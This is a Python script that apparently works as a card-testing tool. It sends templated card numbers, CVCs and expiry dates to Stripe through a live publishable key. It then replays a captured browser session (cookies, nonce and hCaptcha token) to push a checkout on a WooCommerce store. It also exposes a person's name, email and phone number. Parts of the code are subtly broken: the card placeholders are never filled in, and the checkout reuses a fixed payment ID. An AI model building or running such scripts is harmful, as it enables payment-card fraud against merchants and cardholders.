import requests

headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-IQ,ar;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

data = 'type=card&billing_details[name]=hesham+&billing_details[email]=heshamhamodi22k%40gmail.com&billing_details[phone]=7737378372&billing_details[address][country]=IQ&billing_details[address][city]=&billing_details[address][postal_code]=&billing_details[address][state]=&billing_details[address][line1]=&billing_details[address][line2]=&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=fdde2e57-8e1a-474f-a073-731e8c99fdb8752d8d&muid=81e6c322-ce83-4c94-8c4c-677caadd164619b66c&sid=421293ee-13cc-449c-a981-acf7bf0991d8f4e862&payment_user_agent=stripe.js%2F93f78cd485%3B+stripe-js-v3%2F93f78cd485%3B+split-card-element&referrer=https%3A%2F%2Fdietncheat.com&time_on_page=139685&key=pk_live_51PFHCMCnQfHsPvjB4PVdqv1QZjRkdRftgKhKbx1bGGYUKJPzUeB8gNMKGW0IrLc7t2VYtCOmCmg7SSwHRy4GkGIc00ZWuzK2Kj&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYjtHdAtr2yJTK0TIJiVybhu2OKb0LlYcgRnQwvxS4do_9kFC2QD4MqNZ4xo22tnwvStiHD6kToXCM6fiC-ARG_9KlmXYn-xC3hcu2ni6k5_xWCSVrwbts44TofsOv5t99Gg3eyFTmpdBMy--8Wp6fZ1op-ejOwX3rOrNdSB7hW8ca21X5CPSByJKqoqOc-d2Xbx0dyCkgFKDQX9t3vke-LTOkFiOq7BaibHGWKazDQRcMgcQAk-mrU04xPzjk1XzYiRxO-3VY4sFI5cJpMxVvVGnpRAyUQAd6tkaACoMjSDdscN2hPh9LHznoontGuvIOO1HncQpF4sc9cxxgN_qMRQF8v9IfjQJQlVB5w7uuxKiKeAy4_XXGvgAsVXiGA0rSTq9jyzrydVkqRj6HaDXl4hXvPNVUugwuZuVxQXDCKikpQMxns21jYAVGpszUx1rHYLXdaygcpkqW29Zw2fNFOL99dttalVgLXA96C1UTBBR9i9XGIh73OUJ8LwZdtoksfvy2Kv5R3Ez6yfqqJfYXNhIofFgcF1Zc8LNPSoJVo5yGUqtHyctPSEsxh3IkOqxn5maCPwCl5ffq_Ex-jT5bUNnhgHL4OtF4X2JPLQsjPamql53DIA6JQb-rlkdVBwvX8zTHnI5kHmLWiExOlHKPGWxmfRLTikT07Wwm2vC-zm2xLSanu_8mYVUCYvDPnofiWUk8YBJMwE1ixiP-u5vehwrrbmFV_jJYPIf9RZXukXDkfBALZ2SVQnJLZjWISskB2zDcpXdq9lIT_v34aIu7vFTMFIiBDhc8uBDOlchK_AdDl-BS_VXEGGPNdmeUGiujDMHt8Bp5ytEK0HDMAIatggVsDCMA7Ql9RKMZ4JnJmkU7UM1eVAdGhZUiaOQodeDu5uk_qjkEHQ1-bFBBgATl_H-PuSa2YcHTZhdXpIigfFHWWL6NSpjIwqGIRhuSP7qszkGWyV7IE85KE0qWET74zLAvSfmFkL9U0AIBTOzUpb3pCgg-aeH2uXC6ev4R7kIRXCLVsHrSyKStum0EivCgL9qCw158sHOLKlTltS6QbO3r-MEGs8EBToP5TxAEbBVk14YUMP7ZcNqptwTcxjmI8RSPyb5fVny0asMRLIZdxHBWOZ_mbsxHl7lQdi_CbuC4lZHuKR4o3_V_F8oaXCu15oE9VA9JptoboTOLiTJcV8Fw28X-f4GDakHzsrAwLv_aU0bNZyr28xdy87VsmE9ZcXsBxADy2IXgelmWYitr3bSAw0G6dec4FiJdEm09pXuqutZncoy5XJ7H-xj9KKchVyBFtNRu_vYj61vNpDs0CLzbNShqdT7BM1oRbXyxAswuS4fgTB8kNvxio3r1zXqY9iMk-hl9MC9RIWQ0BkPaLl47W-ziA4x69tKQT1RFf6I96FP6vV5za6ldssZ6M66GuDJY2xKdDsfBu9iLj2yH58pAIxlYLXRQ0uXKNyXAwMkjOgOHdYps2AX1UcAn7IrqmL7d47JxxtxJ23KjwbJ10L7LOB2MBqLF3lSUHDrqZdEmioE8gdQoMZopRXLbYgXuYP1DOgUvL9xdIN8gouo4QwdH6XL3IXDWXvv9ul9Rm0TFtiLhHVqBYGhidyyPVLHMr0T6bKg_ukqwkByB6YdWGPPN2WnNE4yLDgcj8cScvMnc-1PfQ3k4v0gd8zCFDa52Y486aTmleVYGpEX03aLsqfim8EtyLhFPN2a_jjQPyPbL5xTYWlh2b24MFlY6NoFL_N6yLlm_fNR_DMI1-Dk-cS_a3TEh9Ra3rGNo18BEACSIBGzEfATb6d3xZ5qlEbaiFEl9G3NBxBVFlf4ZEt0A8l0qHEc4MDqrwZMDVrisK5hOnKeiQ5Kv64bJCqNoQXFp7i_OJoQzs1-xWH_XQXYAR2mV63xsnpIeAXakj6Z02bQ32Rp8ueg9IdbkiKdIeKkxDENlO7h-onqGQUkHnMOeo-qFeMvezUnZbUGQjlltK1vYAW1g0s7qStikheu9EvNG4sQBp240363uywLZrJg_OyAJ4bg--PzGzhoq6P4fwFFE08Gzs2G5dLNBZMPA9gPGxMmYRflnT3tyXxa5QCaUUSD3EYJ-jZXhwzmZx6g2oc2hhcmRfaWTOAzGDb6JrcqgzN2RmMGQzY6JwZAA.cBpUqb2k8zDhIvD3UCRiBLE8kn-Di6e587wIxsSupi8'

response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
id=response.json()['id']
import requests

cookies = {
    'pll_language': 'en',
    '_ga': 'GA1.1.370454643.1718741294',
    '_fbp': 'fb.1.1718741300996.133585039133852246',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-06-18%2020%3A08%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fdietncheat.com%2F%2310%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-06-18%2020%3A08%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fdietncheat.com%2F%2310%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'wffn_flt': '2024-6-18 20:08:23',
    'wffn_timezone': 'Asia/Baghdad',
    'wffn_is_mobile': 'true',
    'wffn_browser': 'Chrome',
    'wffn_referrer': '',
    'wffn_fl_url': '/',
    '_scid': '59236c4e-d69b-4894-a6d7-1410e87b21e6',
    '_tt_enable_cookie': '1',
    '_ttp': '6ntaWLZShDj03h3MyRU5U2m195D',
    '_sctr': '1%7C1718658000000',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': '70e5c96c21a65fa368de9a97ac230f1e',
    'PHPSESSID': 'hkote33aao0cp4f9arhu8bajhk',
    'wp_woocommerce_session_e03f3775a42657fc58cf7fb79c6a8510': 't_e4b8c2ee596543e468ee4d57734cdc%7C%7C1718914142%7C%7C1718910542%7C%7C6716d8502289b478588fe70e7b115f2b',
    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdietncheat.com%2Fcheckouts%2Fbudget-1%2F',
    'wffn_si': '2da51dc2348dbb5d6ae3689ef6ad3a42',
    'uael-timer-cdTime-3504edf': '1718827752514',
    'uael-timer-evgInt-3504edf': '86400000',
    'uael-timer-firstTime-3504edf': '1718741352514',
    'uael-time-to-run-3504edf': '1718827752505',
    'uael-timer-cdTime-33eea6b': '1718827752577',
    'uael-timer-evgInt-33eea6b': '86400000',
    'uael-timer-firstTime-33eea6b': '1718741352577',
    'uael-time-to-run-33eea6b': '1718827752569',
    'uael-timer-days-3504edf': '0',
    'uael-timer-hours-3504edf': '23',
    'uael-timer-days-33eea6b': '0',
    'uael-timer-hours-33eea6b': '23',
    '_scid_r': '59236c4e-d69b-4894-a6d7-1410e87b21e6',
    'wffn_ay_2da51dc2348dbb5d6ae3689ef6ad3a42': '[11766]',
    '_gcl_au': '1.1.1605000181.1718741271.1774846112.1718741366.1718741365',
    '__stripe_mid': '81e6c322-ce83-4c94-8c4c-677caadd164619b66c',
    '__stripe_sid': '421293ee-13cc-449c-a981-acf7bf0991d8f4e862',
    'amp_8e87cd': 'oqyzFp5W9o1k2DTb0b2MDR...1i0mfg0vr.1i0mfg0vr.0.0.0',
    'amp_8e87cd_dietncheat.com': 'oqyzFp5W9o1k2DTb0b2MDR...1i0mfg0vr.1i0mfg11k.0.0.0',
    'bwfan_session': '1',
    'bwfan_visitor': 'u69b2ZuEBBDIed6w',
    'xxx111otrckid': '653291e4-19db-4f7c-b2b0-07f0f824d26c',
    'ajs_anonymous_id': '653291e4-19db-4f7c-b2b0-07f0f824d26c',
    'wfocu_si': 'f272437acb6683462e4973bc115e2f8e',
    '_ga_LG0G3025ZY': 'GS1.1.1718741293.1.1.1718741412.12.0.731317389',
    'uael-timer-minutes-3504edf': '57',
    'uael-timer-minutes-33eea6b': '57',
    'uael-timer-distance-3504edf': '86258942',
    'uael-timer-seconds-3504edf': '38',
    'uael-timer-distance-33eea6b': '86258875',
    'uael-timer-seconds-33eea6b': '38',
}

headers = {
    'authority': 'dietncheat.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-IQ,ar;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'pll_language=en; _ga=GA1.1.370454643.1718741294; _fbp=fb.1.1718741300996.133585039133852246; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-06-18%2020%3A08%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fdietncheat.com%2F%2310%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-06-18%2020%3A08%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fdietncheat.com%2F%2310%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wffn_flt=2024-6-18 20:08:23; wffn_timezone=Asia/Baghdad; wffn_is_mobile=true; wffn_browser=Chrome; wffn_referrer=; wffn_fl_url=/; _scid=59236c4e-d69b-4894-a6d7-1410e87b21e6; _tt_enable_cookie=1; _ttp=6ntaWLZShDj03h3MyRU5U2m195D; _sctr=1%7C1718658000000; woocommerce_items_in_cart=1; woocommerce_cart_hash=70e5c96c21a65fa368de9a97ac230f1e; PHPSESSID=hkote33aao0cp4f9arhu8bajhk; wp_woocommerce_session_e03f3775a42657fc58cf7fb79c6a8510=t_e4b8c2ee596543e468ee4d57734cdc%7C%7C1718914142%7C%7C1718910542%7C%7C6716d8502289b478588fe70e7b115f2b; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdietncheat.com%2Fcheckouts%2Fbudget-1%2F; wffn_si=2da51dc2348dbb5d6ae3689ef6ad3a42; uael-timer-cdTime-3504edf=1718827752514; uael-timer-evgInt-3504edf=86400000; uael-timer-firstTime-3504edf=1718741352514; uael-time-to-run-3504edf=1718827752505; uael-timer-cdTime-33eea6b=1718827752577; uael-timer-evgInt-33eea6b=86400000; uael-timer-firstTime-33eea6b=1718741352577; uael-time-to-run-33eea6b=1718827752569; uael-timer-days-3504edf=0; uael-timer-hours-3504edf=23; uael-timer-days-33eea6b=0; uael-timer-hours-33eea6b=23; _scid_r=59236c4e-d69b-4894-a6d7-1410e87b21e6; wffn_ay_2da51dc2348dbb5d6ae3689ef6ad3a42=[11766]; _gcl_au=1.1.1605000181.1718741271.1774846112.1718741366.1718741365; __stripe_mid=81e6c322-ce83-4c94-8c4c-677caadd164619b66c; __stripe_sid=421293ee-13cc-449c-a981-acf7bf0991d8f4e862; amp_8e87cd=oqyzFp5W9o1k2DTb0b2MDR...1i0mfg0vr.1i0mfg0vr.0.0.0; amp_8e87cd_dietncheat.com=oqyzFp5W9o1k2DTb0b2MDR...1i0mfg0vr.1i0mfg11k.0.0.0; bwfan_session=1; bwfan_visitor=u69b2ZuEBBDIed6w; xxx111otrckid=653291e4-19db-4f7c-b2b0-07f0f824d26c; ajs_anonymous_id=653291e4-19db-4f7c-b2b0-07f0f824d26c; wfocu_si=f272437acb6683462e4973bc115e2f8e; _ga_LG0G3025ZY=GS1.1.1718741293.1.1.1718741412.12.0.731317389; uael-timer-minutes-3504edf=57; uael-timer-minutes-33eea6b=57; uael-timer-distance-3504edf=86258942; uael-timer-seconds-3504edf=38; uael-timer-distance-33eea6b=86258875; uael-timer-seconds-33eea6b=38',
    'origin': 'https://dietncheat.com',
    'referer': 'https://dietncheat.com/checkouts/budget-1/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

params = {
    'wc-ajax': 'checkout',
    'wfacp_id': '11766',
    'wfacp_is_checkout_override': 'no',
}

data = '_wfacp_post_id=11766&wfacp_cart_hash=d469b6d674fcae7942e5a31de68687ea&wfacp_has_active_multi_checkout=&wfacp_source=https%3A%2F%2Fdietncheat.com%2Fcheckouts%2Fbudget-1%2F&product_switcher_need_refresh=1&wfacp_cart_contains_subscription=0&wfacp_exchange_keys=%7B%22pre_built%22%3A%7B%7D%2C%22elementor%22%3A%7B%22wfacp_form%22%3A%22c23ed0e%22%2C%22wfacp_form_summary%22%3A%22871851e%22%7D%7D&wfacp_input_hidden_data=%7B%7D&wfacp_input_phone_field=%7B%7D&wfacp_timezone=Asia%2FBaghdad&billing_country=IQ&wfob_input_hidden_data=%7B%7D&billing_email=heshamhamodi22k%40gmail.com&bwfan_cart_id=20421&billing_first_name=hesham&billing_phone=7737378372&wfacp_product_choosen=on&wfacp_product_switcher_quantity_wfacp_64c34cb73b38a=1&payment_method=fkwcs_stripe&terms=1&terms-field=1&bwfan_user_consent=1&woocommerce-process-checkout-nonce=5b9b803aaf&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review%26wfacp_id%3D11766%26wfacp_is_checkout_override%3Dno&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fdietncheat.com%2F%2310&wc_order_attribution_session_start_time=2024-06-18+20%3A08%3A21&wc_order_attribution_session_pages=2&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fdietncheat.com%2F%2310&wc_order_attribution_session_start_time=2024-06-18+20%3A08%3A21&wc_order_attribution_session_pages=2&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&fkwcs_source=pm_1PT8NNCnQfHsPvjBkupWAetv'

response = requests.post('https://dietncheat.com/', params=params, cookies=cookies, headers=headers, data=data)
print(response.json())